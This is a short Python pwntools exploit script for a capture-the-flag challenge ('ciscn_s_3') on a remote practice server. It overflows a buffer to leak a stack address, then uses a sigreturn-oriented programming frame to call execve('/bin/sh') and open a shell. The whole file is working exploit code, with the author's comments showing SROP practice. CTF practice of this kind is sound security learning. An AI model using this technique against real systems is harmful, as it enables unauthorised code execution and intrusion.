from pwn import *

# sh = process("./ciscn_s_3")
sh = remote("node4.buuoj.cn", 26303)
context(arch="amd64", os="linux", log_level="debug")

vuln = 0x4004F1
sigreturn = 0x4004DA
system_call = 0x400517

payload = cyclic(0x10) + p64(vuln)
sh.send(payload)
sh.recv(0x20)
binsh_addr = u64(sh.recv(0x8)) - 0x110
# 0x140 on localhost, 0x110 on remote
# gdb.attach(sh)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = system_call
# I haven't really understood SROP method until this challenge
payload = b"/bin/sh\x00" + cyclic(8) + p64(sigreturn) + p64(system_call) + bytes(frame)
sh.send(payload)
sh.interactive()
